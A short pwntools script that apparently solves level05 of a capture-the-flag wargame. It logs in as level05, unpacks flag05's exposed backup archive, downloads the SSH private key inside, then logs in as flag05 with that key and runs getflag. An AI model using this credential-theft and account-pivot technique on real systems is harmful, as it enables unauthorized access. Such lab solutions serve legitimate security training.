#!/usr/bin/python3

from pwn import *
from sys import argv,exit

if len(argv) < 2:
	sys.exit("Target IP Missing") 

level05 = ssh(host=argv[1],user='level05',password='level05')
level05_shell = level05.shell('sh')
level05.sendline('tar -xvf /home/flag05/.backup/backup-19072011.tgz -C /tmp/')
file = level05.download_file(remote='/tmp/.ssh/id_rsa',local='/tmp/id_rsa')
level05_shell.kill()
level05.close()

log.progress(f"Got flag05 user's ssh private key : /tmp/id_rsa")

flag05 = ssh(host=argv[1],user='flag05',keyfile='/tmp/id_rsa')
flag05_shell = flag05.shell('sh')
flag05_shell.sendline('getflag')
flag05_shell.interactive(prompt='')